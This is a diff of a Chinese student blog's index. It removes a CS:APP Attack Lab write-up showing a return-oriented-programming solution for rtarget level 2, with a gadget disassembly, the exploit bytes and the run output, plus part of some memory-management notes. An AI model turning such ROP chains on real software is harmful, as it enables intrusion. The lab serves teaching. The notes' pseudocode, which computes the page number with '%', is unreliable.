-<h2 id="题解-RTARGET"><a href="#题解-RTARGET" class="headerlink" title="题解: RTARGET"></a>题解: RTARGET</h2><p>我们在上一部分利用了缓冲区溢出, 从而劫持返回地址, 将地址返回至我们期望的地址. 除此之外我们还将代码注入进缓冲区, 并通过返回地址执行这段代码. 我们还注意到了在程序的运行的过程中可能存在的内存覆盖, 因此我们规避并选取适当的地方来储存数据.</p>
-<p>上述手段被称为 <strong>代码注入攻击</strong> (code injection attack) 已经是”莫里斯蠕虫”时代的手法了, 现代编译器使用 <strong>地址空间布局随机化</strong>(Address space layout randomization, ASLR), 栈空间代码禁止执行(增加 “可执行” 的权限位) , 与<strong>金丝雀</strong>(Canary) 等多种手段防范代码注入攻击. 对于前两种防御手段, 黑客们使用了名为 <strong>面向返回编程</strong> (Return-oriented programming, ROP) 的技巧, 仅仅使用原有代码的部分碎片拼接成待执行的代码. </p>
-<p>本题将学习ROP来进行代码攻击. 在此之前, 有必要讲解 <em>gadgetfarm</em></p>
-<h3 id="Gadget-Farm-的使用"><a href="#Gadget-Farm-的使用" class="headerlink" title="Gadget Farm 的使用"></a>Gadget Farm 的使用</h3><p>在rtagret中包括了一系列函数,  里面包括的一系列字节码将被我们作为碎片(gadget) 进行拼接并使用. 这些函数被称为farm函数</p>
-<p>我们可以拿到 farm 中的小gadgets:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">objdump rtarget &gt; farm-dump.txt</span><br></pre></td></tr></table></figure>
-<p> 得到的文件中只有一部分是我们需要的, 删去不必要的代码后, 最终拿到:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rtarget:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">Disassembly of section .init:</span><br><span class="line"></span><br><span class="line">0000000000401994 &lt;start_farm&gt;:</span><br><span class="line">  401994:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  401999:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000040199a &lt;getval_142&gt;:</span><br><span class="line">  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax</span><br><span class="line">  40199f:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019ae &lt;setval_237&gt;:</span><br><span class="line">  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)</span><br><span class="line">  4019b4:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019b5 &lt;setval_424&gt;:</span><br><span class="line">  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)</span><br><span class="line">  4019bb:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019bc &lt;setval_470&gt;:</span><br><span class="line">  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)</span><br><span class="line">  4019c2:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019d0 &lt;mid_farm&gt;:</span><br><span class="line">  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4019d5:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019db &lt;getval_481&gt;:</span><br><span class="line">  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax</span><br><span class="line">  4019e0:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019e1 &lt;setval_296&gt;:</span><br><span class="line">  4019e1:	c7 07 99 d1 90 90    	movl   $0x9090d199,(%rdi)</span><br><span class="line">  4019e7:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019e8 &lt;addval_113&gt;:</span><br><span class="line">  4019e8:	8d 87 89 ce 78 c9    	lea    -0x36873177(%rdi),%eax</span><br><span class="line">  4019ee:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019ef &lt;addval_490&gt;:</span><br><span class="line">  4019ef:	8d 87 8d d1 20 db    	lea    -0x24df2e73(%rdi),%eax</span><br><span class="line">  4019f5:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019f6 &lt;getval_226&gt;:</span><br><span class="line">  4019f6:	b8 89 d1 48 c0       	mov    $0xc048d189,%eax</span><br><span class="line">  4019fb:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019fc &lt;setval_384&gt;:</span><br><span class="line">  4019fc:	c7 07 81 d1 84 c0    	movl   $0xc084d181,(%rdi)</span><br><span class="line">  401a02:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a03 &lt;addval_190&gt;:</span><br><span class="line">  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax</span><br><span class="line">  401a09:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a0a &lt;setval_276&gt;:</span><br><span class="line">  401a0a:	c7 07 88 c2 08 c9    	movl   $0xc908c288,(%rdi)</span><br><span class="line">  401a10:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a11 &lt;addval_436&gt;:</span><br><span class="line">  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax</span><br><span class="line">  401a17:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a18 &lt;getval_345&gt;:</span><br><span class="line">  401a18:	b8 48 89 e0 c1       	mov    $0xc1e08948,%eax</span><br><span class="line">  401a1d:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a1e &lt;addval_479&gt;:</span><br><span class="line">  401a1e:	8d 87 89 c2 00 c9    	lea    -0x36ff3d77(%rdi),%eax</span><br><span class="line">  401a24:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a25 &lt;addval_187&gt;:</span><br><span class="line">  401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax</span><br><span class="line">  401a2b:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a2c &lt;setval_248&gt;:</span><br><span class="line">  401a2c:	c7 07 81 ce 08 db    	movl   $0xdb08ce81,(%rdi)</span><br><span class="line">  401a32:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a33 &lt;getval_159&gt;:</span><br><span class="line">  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax</span><br><span class="line">  401a38:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a39 &lt;addval_110&gt;:</span><br><span class="line">  401a39:	8d 87 c8 89 e0 c3    	lea    -0x3c1f7638(%rdi),%eax</span><br><span class="line">  401a3f:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a40 &lt;addval_487&gt;:</span><br><span class="line">  401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax</span><br><span class="line">  401a46:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a47 &lt;addval_201&gt;:</span><br><span class="line">  401a47:	8d 87 48 89 e0 c7    	lea    -0x381f76b8(%rdi),%eax</span><br><span class="line">  401a4d:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a4e &lt;getval_272&gt;:</span><br><span class="line">  401a4e:	b8 99 d1 08 d2       	mov    $0xd208d199,%eax</span><br><span class="line">  401a53:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a54 &lt;getval_155&gt;:</span><br><span class="line">  401a54:	b8 89 c2 c4 c9       	mov    $0xc9c4c289,%eax</span><br><span class="line">  401a59:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a5a &lt;setval_299&gt;:</span><br><span class="line">  401a5a:	c7 07 48 89 e0 91    	movl   $0x91e08948,(%rdi)</span><br><span class="line">  401a60:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a61 &lt;addval_404&gt;:</span><br><span class="line">  401a61:	8d 87 89 ce 92 c3    	lea    -0x3c6d3177(%rdi),%eax</span><br><span class="line">  401a67:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a68 &lt;getval_311&gt;:</span><br><span class="line">  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax</span><br><span class="line">  401a6d:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a6e &lt;setval_167&gt;:</span><br><span class="line">  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)</span><br><span class="line">  401a74:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a75 &lt;setval_328&gt;:</span><br><span class="line">  401a75:	c7 07 81 c2 38 d2    	movl   $0xd238c281,(%rdi)</span><br><span class="line">  401a7b:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a7c &lt;setval_450&gt;:</span><br><span class="line">  401a7c:	c7 07 09 ce 08 c9    	movl   $0xc908ce09,(%rdi)</span><br><span class="line">  401a82:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a83 &lt;addval_358&gt;:</span><br><span class="line">  401a83:	8d 87 08 89 e0 90    	lea    -0x6f1f76f8(%rdi),%eax</span><br><span class="line">  401a89:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a8a &lt;addval_124&gt;:</span><br><span class="line">  401a8a:	8d 87 89 c2 c7 3c    	lea    0x3cc7c289(%rdi),%eax</span><br><span class="line">  401a90:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a91 &lt;getval_169&gt;:</span><br><span class="line">  401a91:	b8 88 ce 20 c0       	mov    $0xc020ce88,%eax</span><br><span class="line">  401a96:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a97 &lt;setval_181&gt;:</span><br><span class="line">  401a97:	c7 07 48 89 e0 c2    	movl   $0xc2e08948,(%rdi)</span><br><span class="line">  401a9d:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a9e &lt;addval_184&gt;:</span><br><span class="line">  401a9e:	8d 87 89 c2 60 d2    	lea    -0x2d9f3d77(%rdi),%eax</span><br><span class="line">  401aa4:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401aa5 &lt;getval_472&gt;:</span><br><span class="line">  401aa5:	b8 8d ce 20 d2       	mov    $0xd220ce8d,%eax</span><br><span class="line">  401aaa:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401aab &lt;setval_350&gt;:</span><br><span class="line">  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)</span><br><span class="line">  401ab1:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401ab2 &lt;end_farm&gt;:</span><br><span class="line">  401ab2:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  401ab7:	c3                   	retq   </span><br><span class="line">  401ab8:	90                   	nop</span><br><span class="line">  401ab9:	90                   	nop</span><br><span class="line">  401aba:	90                   	nop</span><br><span class="line">  401abb:	90                   	nop</span><br><span class="line">  401abc:	90                   	nop</span><br><span class="line">  401abd:	90                   	nop</span><br><span class="line">  401abe:	90                   	nop</span><br><span class="line">  401abf:	90                   	nop</span><br></pre></td></tr></table></figure>
-<p>题目还提供了部分汇编指令的对应的字节表示:</p>
-<p><img src="../../Lab-Notes/img/Byte encoding of instructions.png" alt="byte coding"></p>
-<h3 id="RLevel2"><a href="#RLevel2" class="headerlink" title="RLevel2"></a>RLevel2</h3><p>题目本身与Ctarget一致, 区别在于源代码编译的过程中使用了ASLR与禁止栈执行. 笔记中前缀 R 以示区分.</p>
-<p>先来回顾一下我们在Level2中干了什么, 我们将代码注入了缓冲区, 并运行之, 从而使得cookie写入rdi寄存器. </p>
-<p>在本题中, 我们选择先将 cookie 存入栈中, 然后使用 pop 指令将cookie推入$rdi 寄存器.</p>
-<p>然而很遗憾, farm中并没有 <code>pop $rdi</code>对应的指令 5f , 倒是 <code>pop $rax</code> 对应的58指令频繁出现, 我们于是考虑迂回作战, 先将cookie推入rax, 再使用 <code>mov $rax,$rdi</code> 完成目标.</p>
-<p>farm中有很多条路径可以实现上述目标, 我选择的是 <code>&lt;getval_280&gt;</code> 与 <code>&lt;setval_426&gt;</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:	c3                   	retq  </span><br><span class="line">&#x2F;*</span><br><span class="line">起始于0x4019cc</span><br><span class="line">58 : pop $rax </span><br><span class="line">90 : no op</span><br><span class="line">c3 : retq</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:	c3                   	retq   </span><br><span class="line">&#x2F;*</span><br><span class="line">起始于0x4019c5</span><br><span class="line">48 89 c7 : mov $rax,$rdi</span><br><span class="line">90 : no op</span><br><span class="line">c3 : retq</span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure>
-<p>因此图解如下: </p>
-<p><img src="../../Lab-Notes/img/Rtouch2_pic.png" alt="Rtouch2_pic"></p>
-<p>答案为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">cc 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
-<p>大功告成</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;shell 输入</span><br><span class="line">.&#x2F;hex2raw &lt;in4.txt &gt; out4</span><br><span class="line">.&#x2F;rtarget -i out4 -q</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;shell 输出</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
-<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>2020年7月3日~7月8日. 完成了CS:APP 第三个配套实验 Attack Lab.</p>
-<p>这个实验包括了大量的需要自学的内容, 涉及到内存中栈的管理, 函数跳转(retq)的方式, 缓冲区溢出错误, gets()等函数的缺陷等知识点. 了解并尝试了 代码注入攻击, 面向返回编程等代码攻击手段. 了解了 空间布局随机化, 栈禁止执行, 金丝雀区的设置 等代码防御方式.</p>
-<p>提高了自学能力以及对 gdb 等调试工具的使用能力.</p>
-<p>由于本实验最后一小题 RLevel3 本身并没有新知识点 但需要花费大量时间解题, 故暂时略去不做.</p>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-        <category>乘龙术</category>
-        <category>CSAPP</category>
-      </categories>
-      <tags>
-        <tag>读书笔记:技术</tag>
-        <tag>CSAPP</tag>
-        <tag>Lab</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>时与光W_202007-1</title>
     <url>/2020/07/06/%E6%97%B6%E4%B8%8E%E5%85%89W-202007-1/</url>
     <content><![CDATA[<p>2020年6月29日 ~ 7月5日.</p>
@@ -898,342 +627,21 @@ T_0\\
       </tags>
   </entry>
   <entry>
-    <title>操作系统之内存管理</title>
-    <url>/2020/06/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
-    <content><![CDATA[<p>本章将会涉及到</p>
-<ol>
-<li>基本内存管理</li>
-<li>Segmentation    分段 </li>
-<li>Swap    交换</li>
-<li>⭐Virtual   虚拟内存</li>
-<li>其他需要考虑的问题</li>
-</ol>
+    <title>时与光H_2020上半年</title>
+    <url>/2020/07/06/%E6%97%B6%E4%B8%8E%E5%85%89H-2020%E4%B8%8A%E5%8D%8A%E5%B9%B4/</url>
+    <content><![CDATA[<p>2020年1月 ~ 6月</p>
+<p>关键词: 疫情, 学习, 健身</p>
 <a id="more"></a>
-<h2 id="基本内存管理"><a href="#基本内存管理" class="headerlink" title="基本内存管理"></a>基本内存管理</h2><p>本节会涉及到:</p>
-<ol>
-<li>储存层次</li>
-<li>CPU利用率</li>
-<li>重定位<ol>
-<li>Base &amp; Limit</li>
-<li>什么时候重定位</li>
-</ol>
-</li>
-</ol>
-<h3 id="储存层次"><a href="#储存层次" class="headerlink" title="储存层次"></a>储存层次</h3><p>参看计组部分, 不是重点, 略</p>
-<h3 id="CPU利用率"><a href="#CPU利用率" class="headerlink" title="CPU利用率"></a>CPU利用率</h3><p>如果考虑到内存的存在, CPU的利用率还将会进一步降低.  如果CPU中同时存在 $n$ 个运行中的程序 (称为多道程序的度 degree) ,则 CPU利用率为</p>
-<script type="math/tex; mode=display">
-1-P^n</script><p>其中 $P$ 是IO等待时间的占比</p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124321.jpg" alt="1591668423275"></p>
-<blockquote>
-<ul>
-<li>These  sizes allow 4 programs to be in memory at once. With an 80% average I/O wait, we have a CPU utilization of 1-0.8^4≈60%. </li>
-<li>Adding another 16MB of memory allow 8 programs, thus raising the CPU utilization to 83%. </li>
-<li>Adding yet another 16MB of memory allow 12 programs, only increase CPU utilization to 93%. </li>
-<li>…97% </li>
-</ul>
-</blockquote>
-<p>下图展示了实际CPU中的资源分配</p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124332.jpg" alt="1591668467874"></p>
-<ul>
-<li>0-10秒内 仅Job1 在工作. CPU利用率为 $1-0.8^1=0.2$ 相当于执行了 $10\times0.2=2 min$</li>
-<li>10-15秒内 Job1/2 在工作. CPU利用率为 $1-0.8^2=0.36$ 平均每个任务相当于执行了 $5\times\frac{1}{2}\times0.36=0.9 min$</li>
-<li>15-20 秒内 Job1/2/3 在工作. CPU利用率为 $1-0.8^3=0.49$ 平均每个任务相当于执行了 $5\times\frac{1}{3}\times0.49=0.8 min$</li>
-<li>……</li>
-</ul>
-<h3 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h3><p>程序本身包含的数据是从零开始<del>的异世界生活</del> 而在实际运行中, 几乎不可能物理地址恰好从零开始, 因此需要将程序中的逻辑地址(也叫相对地址) 转换成物理地址. 这在CPU中是由 MMU (内存控制单元) 完成的.</p>
-<h4 id="基址与限址-Base-amp-Limit"><a href="#基址与限址-Base-amp-Limit" class="headerlink" title="基址与限址   Base &amp; Limit"></a>基址与限址   Base &amp; Limit</h4><p>Base &amp; Limit 都是作为寄存器储存在PCB中, 每个进程都有一个. </p>
-<p>Base 是逻辑地址0 在物理地址空间中的地址(的指针) , 也就是该进程在内存空间中开始的地方. </p>
-<p>Limit 是进程所拥有的最大地址<strong>数目</strong>, Base + Limit 是 进程的最大地址</p>
-<blockquote>
-<p>​    eg Base = 10000   Limit = 4000  ➡ 最大地址为 14000</p>
-</blockquote>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124344.jpg" alt="重定位图"></p>
-<p>如图, 逻辑地址先与limit比较, 无误后再加上base成为物理地址</p>
-<h4 id="MMU"><a href="#MMU" class="headerlink" title="MMU"></a>MMU</h4><p>Memory Management Unit , 内存管理空间, 作用是将虚拟内存转化为实际的物理地址, 再将其送往数据Bus上.</p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124432.jpg" alt="mmu"></p>
-<h4 id="什么时候发生重定位"><a href="#什么时候发生重定位" class="headerlink" title="什么时候发生重定位?"></a>什么时候发生重定位?</h4><p>一般来说有三种:</p>
-<ol>
-<li>编译时, 这种就要求编译之后的程序代码的地址必须是实际运行中的地址, 常用于直接烧录的嵌入式等.</li>
-<li>载入时, 要求载入后程序在内存中的位置必定不变, 无法进行灵活地管理与切换</li>
-<li>运行时, 支持交换 分页等操作</li>
-</ol>
-<hr>
-<h2 id="Segmentation-分段"><a href="#Segmentation-分段" class="headerlink" title="Segmentation 分段"></a>Segmentation 分段</h2><p>在上述讨论中, 我们是把程序的所有东西整体放入内存中. 而事实上, 程序的数据包括代码段(Code), 数据段(Data), 堆栈段(Stack),….</p>
-<p>可能出现的问题: 修改Data数据时误改了Code段; 批处理时可以复用代码段等.</p>
-<p>所以采用分段.每一段的逻辑地址都从0 开始, 每一段都拥有自己的Base 与 Limit , 这些映射关系储存在段表中.</p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609082725.jpg" alt="分段"></p>
-<h3 id="GDT-amp-LDT"><a href="#GDT-amp-LDT" class="headerlink" title="GDT &amp; LDT"></a>GDT &amp; LDT</h3><p>每个进程拥有自己的LDT (Local Descriptor Table) 用于储存进程中每个段的Base等数据.</p>
-<p>OS 拥有一个GDT (Global  Descriptor Table) </p>
-<p>存疑 GDT时用来干什么的?</p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125624.jpg" alt=""></p>
-<h3 id="段的大小"><a href="#段的大小" class="headerlink" title="段的大小"></a>段的大小</h3><p>一般 Inter 16K段, 每段拥有1 billion 32-bit words</p>
-<h3 id="分段与换页的比较"><a href="#分段与换页的比较" class="headerlink" title="分段与换页的比较"></a>分段与换页的比较</h3><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125600.jpg" alt="比较"></p>
-<hr>
-<h2 id="Swap-交换"><a href="#Swap-交换" class="headerlink" title="Swap 交换"></a>Swap 交换</h2><p>本小节涉及到:</p>
-<ol>
-<li>交换的概念</li>
-<li>碎片/空洞</li>
-<li>⭐内存管理机制<ol>
-<li>位图    bit map    </li>
-<li>链表    list</li>
-</ol>
-</li>
-<li>⭐内存的分配机制</li>
-</ol>
-<p>先前说到内存空间的大小远远不够支撑所有进程同时使用. 因此Swap 出现了, 基本思想是谁用, 内存资源给谁. 当另外一个进程需要CPU资源时, 将原先的进程撤出, 换入目标进程.</p>
-<p>内存分区的可以分成固定大小, 缺点是会造成空间的浪费, 并且无法运行大于分区大小的程序. </p>
-<p>分区大小也可以是可变的, 但是随着时间会有碎片(空洞, Holes) 的产生</p>
-<h3 id="Holes-空洞"><a href="#Holes-空洞" class="headerlink" title="Holes 空洞"></a>Holes 空洞</h3><p>空洞的产生</p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124358.jpg" alt=""></p>
-<p>空洞还是难以清除的. 内存是处在高速变化中的, 试图将碎片合并为更大的内存空间片式必须要将目前的进程停滞. 对外表现为长达数十秒甚至分钟的机器假死, 是不可被忍受的.</p>
-<h3 id="内存的管理机制"><a href="#内存的管理机制" class="headerlink" title="内存的管理机制"></a>内存的管理机制</h3><p>将内存划分为更加精细的等大片段, 并记录其是否处于使用中, 如下图</p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124410.jpg" alt="内存管理"></p>
-<h4 id="位图"><a href="#位图" class="headerlink" title="位图"></a>位图</h4><p>如图B, 1表示使用中, 0表示未使用.</p>
-<p>pro: 便于管理, 修改只需要取非操作即可</p>
-<p>con: 难于查找, 每次必须查找n位连续的0; 实际位图很大</p>
-<h4 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h4><p>如图C, P表示process, H表示holes, 第二位表示开始位, 第三位表示长度.</p>
-<p>pro: 便于查找, 只需要比较长度, 节约管理成本.</p>
-<p>con: 难于管理, 归还内存时要合并空洞, 合并内存时要分裂空洞</p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124419.jpg" alt="合并空洞"></p>
-<h3 id="内存的分配机制"><a href="#内存的分配机制" class="headerlink" title="内存的分配机制"></a>内存的分配机制</h3><h4 id="First-fit"><a href="#First-fit" class="headerlink" title="First fit"></a>First fit</h4><p>从0开始找到第一个合适的</p>
-<h4 id="Next-fit"><a href="#Next-fit" class="headerlink" title="Next fit"></a>Next fit</h4><p>从上一次查找结束的地方开始找到第一个合适的</p>
-<h4 id="Best-fit"><a href="#Best-fit" class="headerlink" title="Best fit"></a>Best fit</h4><p>在所有空洞中找<strong>最略大于</strong>所需内存的空洞</p>
-<h4 id="Worst-fit"><a href="#Worst-fit" class="headerlink" title="Worst fit"></a>Worst fit</h4><p>在所有空洞中找<strong>最大于</strong>所需内存的空洞</p>
-<h4 id="Quick-fit"><a href="#Quick-fit" class="headerlink" title="Quick fit"></a>Quick fit</h4><p>随机查找空洞, 只要够用就安排</p>
-<ul>
-<li><p>Fist , Next , Quick 方式 , 只要找到能用的即可, 不考虑空洞体量是否与所需要的符合.</p>
-</li>
-<li><p>Best 问题:</p>
-<ul>
-<li>碎片产生的太多且小</li>
-<li>查找过程太慢</li>
-</ul>
-</li>
-<li><p>Worst 问题</p>
-<ul>
-<li>迅速消耗大空洞</li>
-<li>查找过程太慢</li>
-</ul>
-</li>
-<li><p>实际性能最好的是 Quick fit</p>
-<p><del>这就是无招胜有招吗 👴就是风清扬, i了i了</del></p>
-</li>
-</ul>
-<h2 id="Virtual-Memory-虚拟内存"><a href="#Virtual-Memory-虚拟内存" class="headerlink" title="Virtual Memory 虚拟内存"></a>Virtual Memory 虚拟内存</h2><p>本节包括:</p>
-<ol>
-<li>分页</li>
-<li>多级页表<ol>
-<li>页表每项对应大小</li>
-<li>页表包括的内容</li>
-</ol>
-</li>
-<li>TLB 快表</li>
-<li><del>反转页表</del></li>
-</ol>
-<h3 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h3><p>先前都是按照最大需要的内存来划分空间的. 实际上很多时候是用不到这些空间的. 因此我们在把每个进程(或者段)拆分, 当前使用中的部分在内存中, 其他部分放在磁盘中. </p>
-<p>将进程(或段) 的虚拟空间地址分成一定大小的<strong>页(Page)</strong> , 称为分页.</p>
-<p>将进程(或段) 的物理空间地址分成一定大小的<strong>页帧(Frame)</strong> </p>
-<p>当进程发现所需要的数据所在的页不在内存, 而在磁盘中时, 会发生<strong>页面失效(Page Fault)</strong> , 并通过页面调度将内存中某一页调出, 调入目标页. </p>
-<h4 id="分页过程"><a href="#分页过程" class="headerlink" title="分页过程"></a>分页过程</h4><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125322.jpg" alt="分页"></p>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分页算法  伪代码</span></span><br><span class="line">address ad_lo 	<span class="comment">//逻辑地址,已知</span></span><br><span class="line">address ad_phy	<span class="comment">//物理地址,待求</span></span><br><span class="line">address* Base	<span class="comment">//已知</span></span><br><span class="line">size	 Limit	<span class="comment">//已知</span></span><br><span class="line">size 	page_size	<span class="comment">//每一页的大小, 一般与页帧大小相同,已知</span></span><br><span class="line">pageTable table[]	<span class="comment">//页表,已知</span></span><br><span class="line"><span class="keyword">int</span> pageNo		<span class="comment">//页号,未知</span></span><br><span class="line"><span class="keyword">int</span> frameNo		<span class="comment">//页帧号,未知</span></span><br><span class="line"></span><br><span class="line">getAd_Phy()&#123;</span><br><span class="line">	<span class="keyword">if</span> (ad_lo &gt; *(Base + Limit) )</span><br><span class="line">		<span class="keyword">throw</span> error(<span class="string">"地址越界!"</span>)</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		pageNo = ad_lo % page_size	<span class="comment">//页号</span></span><br><span class="line">		offset = ad_lo - pageNo * page_size		